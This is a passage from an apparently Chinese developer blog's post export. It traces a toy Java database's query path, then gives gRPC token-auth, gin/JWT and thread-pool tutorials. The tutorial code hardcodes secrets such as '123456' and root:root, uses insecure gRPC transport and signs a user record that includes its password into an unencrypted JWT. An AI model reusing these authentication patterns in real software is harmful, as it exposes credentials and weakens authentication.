// 将取出的pg重新插入pIndex if(pg != null) &#123; pIndex.add(pi.pgno, PageX.getFreeSpace(pg)); &#125; else &#123; pIndex.add(pi.pgno, freeSpace); &#125; &#125; 以上是将sql的执行日志保存下来，用于recover，回到table.insert(xid, insert)中接下来才是真正写数据的过程 for (Field field : fields) &#123; if(field.isIndexed()) &#123; field.insert(entry.get(field.fieldName), uid); &#125; &#125; field.insert()向b+树插入数据 public void insert(Object key, long uid) throws Exception &#123; long uKey = value2Uid(key); bt.insert(uKey, uid); &#125; 执行完以上步骤回到tbm.insert() return &quot;insert&quot;.getBytes(); 返回到主函数，执行结束。 9.查询语句执行流程以下面的的sql语句作为例子 ss=&quot;select name,age from students where age=18&quot;; b=ss.getBytes(StandardCharsets.UTF_8); stat = Parser.Parse(b); byte[] output=tbm.read(xid,(Select) stat); 进入tbm.read(xid, (Select) stat)，同样先查询是否存在该表进入table.read(xid, read); public String read(long xid, Select read) throws Exception &#123; // 解析where条件并得到需要查询的uid列表 List&lt;Long&gt; uids = parseWhere(read.where); StringBuilder sb = new StringBuilder(); // 循环遍历uids列表，逐个查询对应的记录，并输出结果 for (Long uid : uids) &#123; byte[] raw = ((TableManagerImpl)tbm).vm.read(xid, uid); if(raw == null) continue; Map&lt;String, Object&gt; entry = parseEntry(raw); sb.append(printEntry(entry)).append(&quot;\\n&quot;); &#125; return sb.toString(); &#125; 首先解析where条件中的字段以及数据parseWhere(Where where)，这一步主要就是找到where条件查询的字段，交给calWhere(fd, where)查找出条件的上下界，其中逻辑比较简单，不在赘述。 private CalWhereRes calWhere(Field fd, Where where) throws Exception &#123; CalWhereRes res = new CalWhereRes(); switch(where.logicOp) &#123; case &quot;&quot;: // 单个where条件 res.single = true; FieldCalRes r = fd.calExp(where.singleExp1); res.l0 = r.left; res.r0 = r.right; break; case &quot;or&quot;: // or查询，两次查询结果取并集 res.single = false; r = fd.calExp(where.singleExp1); res.l0 = r.left; res.r0 = r.right; r = fd.calExp(where.singleExp2); res.l1 = r.left; res.r1 = r.right; break; case &quot;and&quot;: // and查询 最后两个结果取交集 res.single = true; r = fd.calExp(where.singleExp1); res.l0 = r.left; res.r0 = r.right; r = fd.calExp(where.singleExp2); res.l1 = r.left; res.r1 = r.right; if(res.l1 &gt; res.l0) res.l0 = res.l1; if(res.r1 &lt; res.r0) res.r0 = res.r1; break; default: throw Error.InvalidLogOpException; &#125; return res; &#125; class CalWhereRes &#123; long l0, r0, l1, r1; boolean single; &#125; 在calWhere(fd, where)中，会使用fd.calExp(where.singleExp1)，其作用返回一个CalWhereRes类型的结果，其中包含结果的范围。 public FieldCalRes calExp(SingleExpression exp) throws Exception &#123; Object v = null; FieldCalRes res = new FieldCalRes(); switch(exp.compareOp) &#123; case &quot;&lt;&quot;: res.left = 0; v = string2Value(exp.value); res.right = value2Uid(v); if(res.right &gt; 0) &#123; res.right --; &#125; break; case &quot;=&quot;: v = string2Value(exp.value); res.left = value2Uid(v); res.right = res.left; break; case &quot;&gt;&quot;: res.right = Long.MAX_VALUE; v = string2Value(exp.value); res.left = value2Uid(v) + 1; break; &#125; return res; &#125; v = string2Value(exp.value);在insert操作时也会使用将字段数据转换为数字ukey，便于精准查询和范围查询。所以经过calExp()函数的处理后便能够得到响应的左右边界，再到b+树中查询即可。此时的函数调用栈如下图 接着回到parseWhere(Where where)函数中 List&lt;Long&gt; uids = fd.search(l0, r0); if(!single) &#123; // 若为or查询 还要查询l1,r1范围并加入到结果集中 也就是并集 List&lt;Long&gt; tmp = fd.search(l1, r1); uids.addAll(tmp); &#125; return uids; 进入feild中查找fd.search()会调用b+tree的searchRange()方法 public List&lt;Long&gt; search(long left, long right) throws Exception &#123; return bt.searchRange(left, right); &#125; searchRange()代码逻辑如下 public List&lt;Long&gt; searchRange(long leftKey, long rightKey) throws Exception &#123; long rootUid = rootUid(); // 获取根节点的UID long leafUid = searchLeaf(rootUid, leftKey); // 搜索左边界所在的叶子节点 List&lt;Long&gt; uids = new ArrayList&lt;&gt;(); while(true) &#123; Node leaf = Node.loadNode(this, leafUid); // 加载叶子节点 LeafSearchRangeRes res = leaf.leafSearchRange(leftKey, rightKey); // 在叶子节点中搜索符合条件的数据项 leaf.release(); // 释放叶子节点 uids.addAll(res.uids); // 将符合条件的数据项的UID添加到结果列表中 if(res.siblingUid == 0) &#123; // 如果没有兄弟节点，则说明已经搜完了所有符合条件的数据项 break; &#125; else &#123; leafUid = res.siblingUid; // 否则，继续搜索下一个兄弟节点 &#125; &#125; return uids; &#125; 经过leaf.leafSearchRange(leftKey, rightKey);便可以得到符合条件的uid再返回到searchRange()中 while(true) &#123; Node leaf = Node.loadNode(this, leafUid); // 加载叶子节点 LeafSearchRangeRes res = leaf.leafSearchRange(leftKey, rightKey); // 在叶子节点中搜索符合条件的数据项 leaf.release(); // 释放叶子节点 uids.addAll(res.uids); // 将符合条件的数据项的UID添加到结果列表中 if(res.siblingUid == 0) &#123; // 如果没有兄弟节点，则说明已经搜完了所有符合条件的数据项 break; &#125; else &#123; leafUid = res.siblingUid; // 否则，继续搜索下一个兄弟节点 &#125; &#125; return uids; 释放叶子节点，将满足条件的uid加入到集合，返回给feild.search()，再返回到table.search()，此时回到table.read(xid, read)中 // 执行完的代码注释了 public String read(long xid, Select read) throws Exception &#123; // 解析where条件并得到需要查询的uid列表 //List&lt;Long&gt; uids = parseWhere(read.where); StringBuilder sb = new StringBuilder(); // 循环遍历uids列表，逐个查询对应的记录，并输出结果 for (Long uid : uids) &#123; byte[] raw = ((TableManagerImpl)tbm).vm.read(xid, uid); if(raw == null) continue; Map&lt;String, Object&gt; entry = parseEntry(raw); sb.append(printEntry(entry)).append(&quot;\\n&quot;); &#125; return sb.toString(); &#125; 接下来遍历uids列表，交给vm模块，读取uid。vm.read(xid, uid)代码如下，VM继承了计数缓存框架，会先到缓存中查找数据，也就是entry = super.get(uid);这行代码。 public byte[] read(long xid, long uid) throws Exception &#123; lock.lock(); Transaction t = activeTransaction.get(xid); lock.unlock(); if(t.err != null) &#123; throw t.err; &#125; Entry entry = null; try &#123; entry = super.get(uid); // VM继承了计数缓存框架，会先到缓存中查找数据 &#125; catch(Exception e) &#123; if(e == Error.NullEntryException) &#123; return null; &#125; else &#123; throw e; &#125; &#125; try &#123; if(Visibility.isVisible(tm, t, entry)) &#123; return entry.data(); &#125; else &#123; return null; &#125; &#125; finally &#123; entry.release(); &#125; &#125; 接下来进入AbstractCache.get(),代码很长。 protected T get(long key) throws Exception &#123; while(true) &#123; lock.lock(); if(getting.containsKey(key)) &#123; // getting为正在获取某资源的线程 // 请求的资源正在被其他线程获取 lock.unlock(); try &#123; Thread.sleep(1); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); continue; &#125; continue; &#125; if(cache.containsKey(key)) &#123; // 资源在缓存中，直接返回 T obj = cache.get(key); // 将事务xid加入到引用了该uid的列表中 references.put(key, references.get(key) + 1); lock.unlock(); return obj; &#125; // 尝试获取该资源 maxResource是缓存的最大缓存资源数 if(maxResource &gt; 0 &amp;&amp; count == maxResource) &#123; lock.unlock(); throw Error.CacheFullException; &#125; count ++; getting.put(key, true); lock.unlock(); break; &#125; T obj = null; try &#123; // 资源不在缓存中时 obj = getForCache(key); &#125; catch(Exception e) &#123; lock.lock(); count --; getting.remove(key); lock.unlock(); throw e; &#125; lock.lock(); getting.remove(key); cache.put(key, obj); // 将从磁盘中加载的 references.put(key, 1); lock.unlock(); return obj; &#125; 因为是第一次查询所以，肯定不在缓存中，需要到磁盘中查找obj = getForCache(key) protected Entry getForCache(long uid) throws Exception &#123; Entry entry = Entry.loadEntry(this, uid); if(entry == null) &#123; throw Error.NullEntryException; &#125; return entry; &#125; public static Entry loadEntry(VersionManager vm, long uid) throws Exception &#123; DataItem di = ((VersionManagerImpl)vm).dm.read(uid); return newEntry(vm, di, uid); &#125; 获取到entry后,回到AbstractCache.get() lock.lock(); getting.remove(key); cache.put(key, obj); // 将从磁盘中加载的entry放入缓存 references.put(key, 1); lock.unlock(); 此时的调用栈如下继续返回，回到vm.read(xid, uid)中，判断可见性后返回记录。 public byte[] read(long xid, long uid) throws Exception &#123; ... //已执行的代码 try &#123; if(Visibility.isVisible(tm, t, entry)) &#123; return entry.data(); &#125; else &#123; return null; &#125; &#125; finally &#123; entry.release(); 返回到table.read()中,获取的记录如下继续向上返回到tbm.read()，继续返回到主函数，控制台打印结果如下 整个过程有亿点点的复杂，真佩服作者 分析隔离级别读已提交准备两个测试用例，第一个为创建表后向其中插入一条数据 public static void main(String[] args) &#123; TransactionManagerImpl tm= TransactionManager.create(&quot;cun/tm&quot;); DataManager dm=DataManager.create(&quot;cun/dm&quot;,1 &lt;&lt; 20,tm); VersionManager vm= VersionManager.newVersionManager(tm,dm); TableManager tbm=TableManager.create(&quot;cun/&quot;,vm,dm); byte[] res; Executor executor = new Executor(tbm); String begin = &quot;begin&quot;; byte[] beginBytes = begin.getBytes(StandardCharsets.UTF_8); String createTB=&quot;create table students &quot; + &quot;name string,age int32 &quot; + &quot;(index name age)&quot;; byte[] createTBBytes=createTB.getBytes(StandardCharsets.UTF_8); String insertSQL=&quot;insert into students values xiaosun 18&quot;; byte[] insertSQLBytes = insertSQL.getBytes(StandardCharsets.UTF_8); try &#123; byte[] bytes = executor.execute(beginBytes); res = executor.execute(createTBBytes); System.out.println(new String(res)); executor.execute(insertSQLBytes); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; 第二测试用例为查询上述插入的数据 public static void main(String[] args) &#123; TransactionManagerImpl tm= TransactionManager.open(&quot;cun/tm&quot;); DataManager dm=DataManager.open(&quot;cun/dm&quot;,1 &lt;&lt; 20,tm); VersionManager vm= VersionManager.newVersionManager(tm,dm); TableManager tbm=TableManager.open(&quot;cun/&quot;,vm,dm); //开启事务 // BeginRes br=tbm.begin(new Begin()); byte[] res; Executor executor = new Executor(tbm); String begin = &quot;begin&quot;; byte[] beginBytes = begin.getBytes(StandardCharsets.UTF_8); String selectSQL=&quot;select name,age from students where age=18&quot;; byte[] selectSQLBytes=selectSQL.getBytes(StandardCharsets.UTF_8); try &#123; byte[] bytes = executor.execute(beginBytes); res = executor.execute(selectSQLBytes); System.out.println(new String(res)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; 首先执行test1，执行到byte[] execute = executor.execute(commitSQLBytes);,停止，在test2中查看是否可以查询到该记录 再将test1中的commit语句放行，再次运行test2，可以成功查询到，也就是实现了读已提交的隔离级别 可重复读参考","tags":[]},{"title":"grpc","date":"2023-02-07T15:55:11.000Z","path":"2023/02/07/grpc/","text":"grpc入门 准备工作1.安装 protobufhttps://github.com/protocolbuffers/protobuf/releases选择对应版本下载后解压到GOPATH路径下即可 2.在go.mod中引入grpcgo get google.golang.org/grpc 3.安装GO协议编译器的插件go install google.golang.org/protobuf/cmd/protoc-gen-go@v1.28 go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@v1.2 4.编写proto文件创建client和service目录，在两目录中创建proto目录，分别创建client.proto和server.proto文件proto文件相当于一层约束，规定了在rpc调用时，有哪些api，api接口需要传递哪些参数，返回值类型，以及服务名称等信息 syntax &#x3D; &quot;proto3&quot;; &#x2F;&#x2F; 生成go文件时的包名 option go_package &#x3D; &quot;.;service&quot;; &#x2F;&#x2F; 服务定义 service SayHello &#123; &#x2F;&#x2F; 定义一个方法 方法的形参和返回值类型在下面定义 rpc SayHello(HelloRequest) returns (HelloResponse)&#123;&#125; &#125; &#x2F;&#x2F; message 就像是go中struct,java中的class message HelloRequest&#123; string requestName &#x3D; 1; &#x2F;&#x2F; 数字作为标识号 放在函数具体位置 int64 age &#x3D; 2; &#x2F;&#x2F; &#x2F;&#x2F; repeated string ids &#x3D; 3;&#x2F;&#x2F; repeated为切片类型 &#125; message HelloResponse&#123; string responseMsg &#x3D; 1; &#125; 5.初始化项目文件创建client和service目录，在两目录中创建proto目录，之后在cmd中执行 protoc --go_out=. .\\server.proto protoc --go-grpc_out=. .\\server.proto 命令执行成功后会创建hello.pb.go和hello_grpc.pb.go，可以写一个shell脚本进行建立。后面再加 文件目录为 编写代码1.服务端对grpc_pb.go文件中的UnimplementedSayHelloServer函数进行重写 type server struct &#123; pb.UnimplementedSayHelloServer //导入包 pb &quot;grpc_demo/server/proto&quot; &#125; // 实现业务逻辑 func (s *server) SayHello(ctx context.Context,req *pb.HelloRequest) (*pb.HelloResponse, error) &#123; return &amp;pb.HelloResponse&#123;ResponseMsg: &quot;hello, &quot; + req.RequestName&#125;, nil &#125; 启动服务端 监听端口 启动grpc服务 在grpc服务器中注册服务，即上面的server 启动grpc服务func main() &#123; // 监听端口 listen, _ := net.Listen(&quot;tcp&quot;, &quot;:8081&quot;) // 开启grpc服务 grpcServer := grpc.NewServer() // 在grpc服务器中注册我们自己写的服务 pb.RegisterSayHelloServer(grpcServer, &amp;server&#123;&#125;) // 启动服务 err := grpcServer.Serve(listen) if err != nil &#123; panic(err) &#125; &#125; 2.客户端服务端代码相对简单 连接服务端 创建请求服务的客户端 执行rpc调用 获取结果func main() &#123; // 连接到server 此处不使用安全连接 conn, err := grpc.Dial(&quot;127.0.0.1:8081&quot;, grpc.WithTransportCredentials(insecure.NewCredentials())) if err != nil &#123; log.Fatal(err) &#125; defer conn.Close() // 建立连接 client := pb.NewSayHelloClient(conn) // 执行rpc调用，从server端获取执行结果 helloResponse, err := client.SayHello(context.Background(), &amp;pb.HelloRequest&#123;RequestName: &quot;sunzyclient&quot;, Age: 10&#125;) if err != nil &#123; log.Fatal(err) &#125; fmt.Println(helloResponse.GetResponseMsg()) &#125; 通过上面的步骤，即可完成最简单的grpc调用 3.增加token认证server中main.go package main import ( &quot;context&quot; &quot;errors&quot; &quot;fmt&quot; &quot;google.golang.org/grpc&quot; &quot;google.golang.org/grpc/credentials/insecure&quot; &quot;google.golang.org/grpc/metadata&quot; pb &quot;grpc_demo/server/proto&quot; &quot;net&quot; ) type server struct &#123; pb.UnimplementedSayHelloServer &#125; // 实现业务逻辑 func (s *server) SayHello(ctx context.Context,req *pb.HelloRequest) (*pb.HelloResponse, error) &#123; // 获取元数据 md, ok := metadata.FromIncomingContext(ctx) if !ok &#123; return nil, errors.New(&quot;token does not exist&quot;) &#125; var appId string var appKey string if v, ok := md[&quot;appid&quot;]; ok &#123; // 这里所有字母都为小写 appId = v[0] &#125; if v, ok := md[&quot;appkey&quot;]; ok &#123; appKey = v[0] &#125; fmt.Printf(&quot;appId: %v, appKey: %v&quot;, appId, appKey) if appId != &quot;sunzy&quot; || appKey != &quot;123456&quot;&#123; return nil, errors.New(&quot;token error&quot;) &#125; return &amp;pb.HelloResponse&#123;ResponseMsg: &quot;hello, &quot; + req.RequestName&#125;, nil &#125; func main() &#123; // 监听端口 listen, _ := net.Listen(&quot;tcp&quot;, &quot;:8081&quot;) // 开启grpc服务 grpcServer := grpc.NewServer(grpc.Creds(insecure.NewCredentials())) // 在grpc服务器中注册我们自己写的服务 pb.RegisterSayHelloServer(grpcServer, &amp;server&#123;&#125;) // 启动服务 err := grpcServer.Serve(listen) if err != nil &#123; panic(err) &#125; &#125; client中的main.go package main import ( &quot;context&quot; &quot;fmt&quot; &quot;google.golang.org/grpc&quot; &quot;google.golang.org/grpc/credentials/insecure&quot; pb &quot;grpc_demo/server/proto&quot; &quot;log&quot; ) // 自定义token认证 type ClientAuthToken struct &#123; &#125; func (c *ClientAuthToken) GetRequestMetadata(ctx context.Context, uri ...string) (map[string]string, error)&#123; return map[string]string&#123; &quot;appId&quot; : &quot;sunzy&quot;, &quot;appKey&quot; : &quot;123456&quot;, &#125;, nil &#125; func (c *ClientAuthToken) RequireTransportSecurity() bool&#123; return false // 不使用ssl认证 &#125; func main() &#123; var ops []grpc.DialOption ops = append(ops, grpc.WithTransportCredentials(insecure.NewCredentials())) ops = append(ops, grpc.WithPerRPCCredentials(new(ClientAuthToken))) // 连接到server 此处不使用安全连接 conn, err := grpc.Dial(&quot;127.0.0.1:8081&quot;, ops...) if err != nil &#123; log.Fatal(err) &#125; defer conn.Close() // 建立连接 client := pb.NewSayHelloClient(conn) // 执行rpc调用，从server端获取执行结果 helloResponse, err := client.SayHello(context.Background(), &amp;pb.HelloRequest&#123;RequestName: &quot;sunzyclient&quot;, Age: 10&#125;) if err != nil &#123; log.Fatal(err) &#125; fmt.Println(helloResponse.GetResponseMsg()) &#125; grpc拦截器上面代码中token是在服务函数中验证的，显然不合理，grpc与gin一样也有拦截器，可以添加一个拦截器进行token的验证 创建grpc的拦截器 func tokenHandler() grpc.UnaryServerInterceptor &#123; return func(ctx context.Context, req interface&#123;&#125;, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (resp interface&#123;&#125;, err error) &#123; log.Print(&quot;tokenHandler Interceptor...&quot;) // 获取元数据 md, ok := metadata.FromIncomingContext(ctx) if !ok &#123; return nil, errors.New(&quot;token does not exist&quot;) &#125; var appId string var appKey string if v, ok := md[&quot;appid&quot;]; ok &#123; // 这里所有字母都为小写 appId = v[0] &#125; if v, ok := md[&quot;appkey&quot;]; ok &#123; appKey = v[0] &#125; log.Printf(&quot;appId: %v, appKey: %v\\n&quot;, appId, appKey) if appId != &quot;sunzy&quot; || appKey != &quot;123456&quot;&#123; return nil, errors.New(&quot;token error&quot;) &#125; log.Print(&quot;token is valid&quot;) resp, err = handler(ctx,req) return resp, err &#125; &#125; 在main函数中添加拦截器 grpcServer := grpc.NewServer(grpc.Creds(insecure.NewCredentials()),grpc.ChainUnaryInterceptor(tokenHandler())) //添加拦截器","tags":[{"name":"grpc","slug":"grpc","permalink":"https://sunzhengyu99.github.io/tags/grpc/"}]},{"title":"gin_jwt","date":"2023-02-04T13:34:34.000Z","path":"2023/02/04/gin-jwt/","text":"1.jwt JSON Web Token（缩写 JWT）是目前最流行的跨域认证解决方案 jwt官网 1.1 原理JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。这样服务器就不用保存session，实现无状态认证，可扩展性更强 1.2 数据结构JWT主要分为三个部分 Header（头部） Payload（负载） Signature（签名） 可以看出来jwt的组成也十分简单明了 Headerheader中alg(algorithm)决定了签名使用的加密算法，默认为HS256，也可以根据需要修改加密算法(官网提供了多种加密算法)，typ属性表示这个令牌token的类型（type），JWT 令牌统一写为JWT。 Payloadpayload就是要传递的数据，也是一个json对象，JWT 规定了7个官方字段，供选用。 iss (issuer)：签发人 exp (expiration time)：过期时间 sub (subject)：主题 aud (audience)：受众 nbf (Not Before)：生效时间 iat (Issued At)：签发时间 jti (JWT ID)：编号 除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。 &#123; &quot;sub&quot;: &quot;1234567890&quot;, &quot;name&quot;: &quot;John Doe&quot;, &quot;iat&quot;: 1516239022 &#125; 注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。这个 JSON 对象也要使用 Base64URL 算法转成字符串。 SignatureSignature 部分是对前两部分的签名，防止数据篡改。 首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。 HMACSHA256( base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) 算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。 1.3 go实现jwtpackage jwt import ( &quot;crypto/hmac&quot; &quot;crypto/sha256&quot; &quot;encoding/base64&quot; &quot;encoding/json&quot; &quot;errors&quot; &quot;fmt&quot; &quot;strings&quot; ) type header struct &#123; Alg string `json:&quot;alg&quot;` Typ string `json:&quot;typ&quot;` &#125; const ( HS256 = &quot;HS256&quot; ) var alg = HS256 var Secret string func hs256(secret, data []byte) (ret string, err error) &#123; hasher := hmac.New(sha256.New, secret) _, err = hasher.Write(data) if err != nil &#123; return &quot;&quot;, err &#125; r := hasher.Sum(nil) return base64.RawURLEncoding.EncodeToString(r), nil &#125; func Sign(payload interface&#123;&#125;) (ret string, err error) &#123; h := header&#123; Alg: alg, Typ: &quot;JWT&quot;, &#125; marshal, err := json.Marshal(h) if err != nil &#123; return &quot;&quot;, err &#125; bh := base64.RawURLEncoding.EncodeToString(marshal) marshal, err = json.Marshal(payload) if err != nil &#123; return &quot;&quot;, err &#125; bp := base64.RawURLEncoding.EncodeToString(marshal) // 将header和payload 拼接在一起 s := fmt.Sprintf(&quot;%s.%s&quot;, bh, bp) ret, err = hs256([]byte(Secret), []byte(s)) if err != nil &#123; return &quot;&quot;, err &#125; return fmt.Sprintf(&quot;%s.%s.%s&quot;, bh, bp, ret), nil &#125; func Verify(token string) (err error) &#123; parts := strings.Split(token, &quot;.&quot;) data := strings.Join(parts[0:2], &quot;.&quot;) hasher := hmac.New(sha256.New, []byte(Secret)) _, err = hasher.Write([]byte(data)) if err != nil &#123; return err &#125; sig, err := base64.RawURLEncoding.DecodeString(parts[2]) if err != nil &#123; return err &#125; if hmac.Equal(sig, hasher.Sum(nil)) &#123; return nil &#125; return errors.New(&quot;verify is invalid&quot;) &#125; 2.gin框架实现jwt身份认证package main import ( &quot;fmt&quot; &quot;github.com/gin-gonic/gin&quot; &quot;gorm.io/gorm&quot; &quot;gotoken/db&quot; &quot;gotoken/jwt&quot; &quot;net/http&quot; ) type AccountToken struct &#123; Name string `json:&quot;name&quot;` &#125; type User struct&#123; gorm.Model Username string `json:&quot;username&quot;` Password string `json:&quot;password&quot;` &#125; func main() &#123; db := db.GetDatabase() user := User&#123;&#125; //fmt.Println(user) jwt.Secret = &quot;123456&quot; r := gin.Default() // 中间件 相当于拦截器进行鉴权处理 r.Use(func(c *gin.Context) &#123; if c.Request.RequestURI == &quot;/login&quot; &#123; // 如果访问的是login则放行，从而获取token return &#125; token, ok := c.Request.Header[&quot;Token&quot;] fmt.Println(token) if ok &#123; err := jwt.Verify(token[0]) if err != nil &#123; c.AbortWithStatusJSON(403, &quot;Forbidden1&quot;) //jwt toke验证不通过 不放行 &#125; &#125; else &#123; c.AbortWithStatusJSON(403, &quot;Forbidden2&quot;) &#125; &#125;) // 第一次访问该路由获取token r.POST(&quot;/login&quot;, func(c *gin.Context) &#123; userNew := User&#123;&#125; c.ShouldBind(&amp;userNew) if userNew.Username == &quot;&quot; || userNew.Password == &quot;&quot; &#123; c.JSON(http.StatusForbidden, gin.H&#123; &quot;message&quot;: &quot;username or password is empty&quot;, &#125;) return &#125; db.First(&amp;user, &quot;username = ?&quot;, userNew.Username) if user.Username == userNew.Username &amp;&amp; user.Password == userNew.Password &#123; sign, _ := jwt.Sign(user) c.JSON(http.StatusOK, gin.H&#123; &quot;message&quot;: &quot;login successfully!&quot;, &quot;data&quot;: sign, &#125;) &#125; else &#123; c.JSON(http.StatusForbidden, gin.H&#123; &quot;message&quot;: &quot;username or password is invalid&quot;, &#125;) return &#125; &#125;) // 访问此路由不需要token r.GET(&quot;/index&quot;, func(c *gin.Context) &#123; c.JSON(http.StatusOK, &quot;index&quot;) &#125;) r.Run(&quot;:8081&quot;) &#125; 数据库初始化文件 package db import ( &quot;gorm.io/driver/mysql&quot; &quot;gorm.io/gorm&quot; ) var Db *gorm.DB func init() &#123; // 初始化数据库 dsn := &quot;root:root@tcp(127.0.0.1:3306)/demo?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot; db, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;) if err != nil &#123; panic(err) &#125; Db = db &#125; func GetDatabase() *gorm.DB&#123; return Db &#125;","tags":[{"name":"gin, jwt","slug":"gin-jwt","permalink":"https://sunzhengyu99.github.io/tags/gin-jwt/"}]},{"title":"juc","date":"2023-01-24T07:07:48.000Z","path":"2023/01/24/thread-pool/","text":"线程池demo简化版java线程池 package cn.itcast.test; import lombok.extern.slf4j.Slf4j; import java.util.ArrayDeque; import java.util.Deque; import java.util.HashSet; import java.util.concurrent.TimeUnit; import java.util.concurrent.locks.Condition; import java.util.concurrent.locks.ReentrantLock; @Slf4j(topic = &quot;c.ThredPoolDemo&quot;) public class ThredPoolDemo &#123; public static void main(String[] args) &#123; ThreadPool threadPool = new ThreadPool(1, 1000, TimeUnit.MILLISECONDS, 1, ((queue, task) -&gt; &#123; // 1.死等 // queue.put(task); // 2.带超时时间的等待 queue.offer(task, 1500, TimeUnit.MILLISECONDS); // 3.放弃任务执行 // log.debug(&quot;放弃任务&#123;&#125;&quot;, task); // 4.抛出异常 // throw new RuntimeException(&quot;任务执行失败 &quot; + task); // 5.让调用者自己执行任务 // task.run(); // 在主线程中执行任务 &#125;)); for (int i = 0; i &lt; 3; i++) &#123; int id = i; threadPool.execute(()-&gt;&#123; try &#123; Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; log.debug(&quot;&#123;&#125;&quot;, id); &#125;); &#125; &#125; &#125; /** * 将执行策略下放给调用者决定 * @param &lt;T&gt; */ @FunctionalInterface interface RejectPolicy&lt;T&gt;&#123; void reject(BlockingQueue&lt;T&gt; queue, T task); &#125; @Slf4j(topic = &quot;c.ThreadPool&quot;) class ThreadPool &#123; // 任务队列 private BlockingQueue&lt;Runnable&gt; taskQueue; // 线程集合 private HashSet&lt;Worker&gt; workers = new HashSet(); // 核心线程数 private int coreSize; // 超时时间 private long timeout; // 时间单位 private TimeUnit timeUnit; // 拒绝策略 private RejectPolicy&lt;Runnable&gt; rejectPolicy; //执行任务 public void execute(Runnable task)&#123; synchronized (workers)&#123; // 当任务线程数没有超过核心线程数 直接交个worker对象执行 if(workers.size() &lt; coreSize)&#123; Worker worker = new Worker(task); log.debug(&quot;worker被创建&#123;&#125;, task is &#123;&#125;&quot;, worker,task); workers.add(worker); // 执行任务 worker.start(); &#125; else &#123; // 如果任务数超过coreSize 则加入任务队列暂存 // taskQueue.put(task); taskQueue.tryPut(rejectPolicy,task); &#125; &#125; &#125; // 构造函数 public ThreadPool(int coreSize, long timeout, TimeUnit timeUnit,int queueCapatiy, RejectPolicy&lt;Runnable&gt; rejectPolicy) &#123; this.coreSize = coreSize; this.timeout = timeout; this.timeUnit = timeUnit; this.taskQueue = new BlockingQueue&lt;&gt;(queueCapatiy); this.rejectPolicy = rejectPolicy; &#125; // 任务处理对象 class Worker extends Thread&#123; private Runnable task; public Worker(Runnable task) &#123; this.task = task; &#125; @Override public void run() &#123; // 1.当task不为空时，直接执行任务 // 2.当task为空时，需要到任务队列中拉去任务执行 // while(task != null || (task = taskQueue.take()) != null)&#123; while(task != null || (task = taskQueue.poll(timeout, timeUnit)) != null)&#123; try&#123; log.debug(&quot;task正在被执行...&#123;&#125;&quot;, task); task.run(); &#125;catch (Exception e)&#123; &#125;finally &#123; task = null; &#125; &#125; // 退出循环说明任务执行完毕 需要从worker中移除 synchronized (workers)&#123; log.debug(&quot;worker 被移除&#123;&#125;&quot;, this); workers.remove(this); &#125; &#125; &#125; &#125; @Slf4j(topic = &quot;c.BlockingQueue&quot;) class BlockingQueue&lt;T&gt; &#123; // 1.任务队列 private Deque&lt;T&gt; queue = new ArrayDeque&lt;&gt;(); // 2.锁 private ReentrantLock lock = new ReentrantLock(); // 3.生产者条件变量 private Condition fullWaitSet = lock.newCondition(); // 4.消费者条件变量 private Condition emptyWaitSet = lock.newCondition(); // 5.线程池的最大容量 private int capacity; public BlockingQueue(int capacity) &#123; this.capacity = capacity; &#125; public T poll(long timeout, TimeUnit unit) &#123; lock.lock(); try &#123; // 将timeout统一转换为纳秒 long nanos = unit.toNanos(timeout); while (queue.isEmpty()) &#123; try &#123; if (nanos &lt;= 0) &#123; return null; &#125; // 返回的是剩余的等待时间 nanos = emptyWaitSet.awaitNanos(nanos); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; T t = queue.removeFirst(); fullWaitSet.signal(); return t; &#125; finally &#123; lock.unlock(); &#125; &#125; // 阻塞获取 public T take() &#123; lock.lock(); try &#123; while (queue.isEmpty()) &#123; try &#123; emptyWaitSet.await(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; T t = queue.removeFirst(); fullWaitSet.signal(); return t; &#125; finally &#123; lock.unlock(); &#125; &#125; // 带超时时间的阻塞添加 public boolean offer(T task, long timeout, TimeUnit timeUnit)&#123; lock.lock(); try &#123; long nanos = timeUnit.toNanos(timeout); while (queue.size() == capacity) &#123; try &#123; if(nanos &lt;= 0)&#123; return false; &#125; log.debug(&quot;等待加入任务队列&#123;&#125;&quot;, task); nanos = fullWaitSet.awaitNanos(nanos); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; log.debug(&quot;加入任务队列&#123;&#125;&quot;, task); queue.addLast(task); emptyWaitSet.signal(); return true; &#125; finally &#123; lock.unlock(); &#125; &#125; //阻塞添加 public void put(T task) &#123; lock.lock(); try &#123; while (queue.size() == capacity) &#123; try &#123; log.debug(&quot;等待加入任务队列&#123;&#125;&quot;, task); fullWaitSet.await(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; log.debug(&quot;加入任务队列&#123;&#125;&quot;, task); queue.addLast(task); emptyWaitSet.signal(); &#125; finally &#123; lock.unlock(); &#125; &#125; // 有拒绝策略的添加 public void tryPut(RejectPolicy&lt;T&gt; rejectPolicy, T task) &#123; lock.lock(); try &#123; // 判断队列是否满 if(queue.size() == capacity) &#123; rejectPolicy.reject(this, task); &#125; else &#123; // 有空闲 log.debug(&quot;加入任务队列 &#123;&#125;&quot;, task); queue.addLast(task); emptyWaitSet.signal(); &#125; &#125; finally &#123; lock.unlock(); &#125; &#125; // 获取大小 public int getSize() &#123; lock.lock(); try &#123; return queue.size(); &#125; finally 